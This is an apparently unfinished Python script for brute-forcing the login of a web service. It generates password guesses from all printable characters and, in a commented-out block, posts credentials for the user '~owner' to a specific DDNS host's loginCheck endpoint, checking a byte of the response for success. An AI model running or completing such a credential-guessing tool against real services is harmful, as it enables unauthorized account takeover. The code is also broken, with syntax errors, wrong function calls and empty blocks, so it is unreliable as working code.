import requests
import string
import threading
import Queue

def charCheck(charNumb, password, charRange, commandQueue, tryQueue):
    for ii in charRange:
        if charNumb<len(password)-1: # just another charCheck in the whole stack
            succeeded = charCheck(charNumb+1, password, charRange)

        else: #last in charCheck stack (does the communicating)
            tryQueue.put(''.join(password))
            tryQueue.join() # wait for the try to be gotten

            while commandQueue.empty(): #waiting for return
                pass

            while not commandQueue.empty():# gets last sent Queue item
                succeeded = commandQueue.get()

        if not succeeded:
            password[charNumb]=ii
        else:
            return True # a True succeeded returns a True so all of the stacks
            # will terminate if one True is returned

    if charNumb=0: # first in charCheck stack
        tryQueue.put(False) # tells parent thread that it was not that lenght of password
    else:
        return False


if __name__ == "__main__":


'''
To do:

1. make main thread start charCheck as a seperate thread

2. make two queues for charCheck to send the guesses back to the main thread
and to send instructions to charCheck from the main thread

3. make main thread to deal with guesses (post, tell charCheck if correct, etc.)

4. check charCheck is working

5. make sure charCheck waits while main thread is posting. (make it wait for
command from one of the queues)

6. make it so charCheck terminates if it is right
'''

'''
if __name__ == "__main__":
    asciiChars=string.printable
    password=[]
    maxPasswordLen=10
    while True:
        while len(password)<maxPasswordLen:
            password.append("")
            for curChar in asciiChars:

            payload = {'username':'~owner','password':'a_boss'}
            r = requests.post("http://lucieng.ddns.net:5000/loginCheck", data=payload)
            # data is used instead of params because it is url encoded
            if r.text[80:81]==u'e':
                print("WE DID IT JIM")
                break
            elif r.text[80:81]!=u'o':
                print("something weird is going on")
'''
